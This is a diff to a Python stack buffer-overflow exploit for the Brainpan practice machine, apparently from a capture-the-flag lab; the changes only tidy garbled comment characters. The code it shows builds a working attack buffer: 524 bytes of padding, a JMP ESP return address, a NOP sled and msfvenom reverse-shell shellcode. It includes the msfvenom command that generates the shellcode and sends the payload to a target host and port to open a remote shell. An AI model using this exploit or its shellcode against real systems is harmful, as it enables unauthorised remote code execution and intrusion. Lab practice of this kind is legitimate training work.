@@ -201,7 +201,7 @@ import sys
 import socket
 from time import sleep
 
-# â”€â”€â”€ 1. YOUR SHELLCODE INSERTED HERE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 1. YOUR SHELLCODE INSERTED HERE 
 # Your msfvenom shellcode goes here as a bytes literal, generate with: 
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 
@@ -215,22 +215,22 @@ payload = (
  b"\xe7\xc9\xdc\x40\xab\x40\xc3\xd4\x40\x9e\x84"
 )
 
-# â”€â”€â”€ 2. BUILD THE BUFFER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 2. BUILD THE BUFFER 
 #
 # [524 "A" bytes] + [4-byte JMP ESP address] + [NOP sled] + [payload]
 #
 padding = b"A" * 524
 
 # This 4-byte JMP ESP (little-endian) from mona. Change if yours differs.
-eip = b"\xF3\x12\x17\x31" # JMP ESP â†’ 0x311712f3
+eip = b"\xF3\x12\x17\x31" # JMP ESP 0x311712f3
 
 # NOP sled to give the shellcode some landing space
 nop_sled = b"\x90" * 32
 
 buffer = padding + eip + nop_sled + payload
 
-# â”€â”€â”€ 3. SET UP TARGET CONNECTION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-host = "10.10.87.171" # â† change to your Brainpan IP if different
+# 3. SET UP TARGET CONNECTION 
+host = "10.10.87.171" # change to your Brainpan IP if different
 port = 9999
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -247,9 +247,9 @@ try:
 except:
  pass
 
-# â”€â”€â”€ 4. SEND THE EXPLOIT (PASSWORD) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-#
-# Brainpan expects a password line, so append "\r\n" so it's treated as input.
+# 4. SEND THE EXPLOIT (PASSWORD) 
+
+# Brainpan expects a password line, so append "\r\n" so it's treated as input.
 s.send(buffer + b"\r\n")
 print("[+] Exploit buffer sent! The reverse shell should connect back on its own.")
 
